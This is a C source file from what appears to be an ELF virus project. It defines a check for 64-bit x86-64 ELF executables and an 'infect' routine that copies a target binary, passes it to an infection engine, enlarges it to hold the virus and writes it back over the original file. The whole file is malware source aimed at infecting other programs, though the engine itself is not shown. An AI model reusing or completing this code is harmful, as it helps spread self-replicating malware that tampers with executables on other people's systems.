#include "virus.h"
#include "syscalls.h"
#include "utils.h"
#include "logs.h"
#include "errors.h"

#define DELFMAG		((char[4]){ELFMAG0, ELFMAG1, ELFMAG2, ELFMAG3})

#define is_not_elf(e_ident)           (memcmp(e_ident, DELFMAG, SELFMAG) != 0)
#define is_not_64bit(e_ident)         (e_ident[EI_CLASS] != ELFCLASS64)
#define is_not_little_endian(e_ident) (e_ident[EI_DATA] != ELFDATA2LSB)
#define is_not_executable(e_type)     (e_type != ET_EXEC && e_type != ET_DYN)
#define is_not_x86_64(e_machine)      (e_machine != EM_X86_64)
#define has_no_entry(e_entry)         (e_entry == 0)
#define has_no_phoff(e_phoff)         (e_phoff == 0)
#define has_no_shoff(e_shoff)         (e_shoff == 0)

static bool	is_elf64(const char *file)
{
	Elf64_Ehdr	hdr;
	int		fd = sys_open(file, O_RDONLY);

	if (fd < 0) return errors(ERR_SYS, _ERR_S_OPEN_FAILED);

	if (sys_read(fd, &hdr, sizeof(hdr)) < (ssize_t)sizeof(hdr)
	|| is_not_elf(hdr.e_ident)
	|| is_not_64bit(hdr.e_ident)
	|| is_not_little_endian(hdr.e_ident)
	|| is_not_executable(hdr.e_type)
	|| is_not_x86_64(hdr.e_machine)
	|| has_no_entry(hdr.e_entry)
	|| has_no_phoff(hdr.e_phoff)
	|| has_no_shoff(hdr.e_shoff))
	{
		sys_close(fd);
		return errors(ERR_USAGE, _ERR_U_NOT_ELF);
	}
	sys_close(fd);
	return true;
}

inline bool	infect(const struct virus_header *vhdr, const char *file)
{
	struct safe_ptr		file_ref     = {.ptr = NULL, .size = 0};
	struct safe_ptr		clone_ref    = {.ptr = NULL, .size = 0};
	struct virus_header	local_vhdr   = *vhdr;
	size_t			extra_size   = local_vhdr.full_virus_size * 2;
	size_t			shift_amount = 0;

	log_try_infecting(file);

	if (!is_elf64(file)
	|| !init_file_safe(&file_ref, file)
	|| !init_clone_safe(&clone_ref, file_ref.size, extra_size)
	|| !infection_engine(&local_vhdr, file_ref, clone_ref, &shift_amount)
	|| !write_file(clone_ref, file_ref.size + shift_amount, file))
	{
		free_accessor(&file_ref);
		free_accessor(&clone_ref);
		return errors(ERR_THROW, _ERR_T_INFECT);
	}
	free_accessor(&file_ref);
	free_accessor(&clone_ref);

	log_success();
	return true;
}
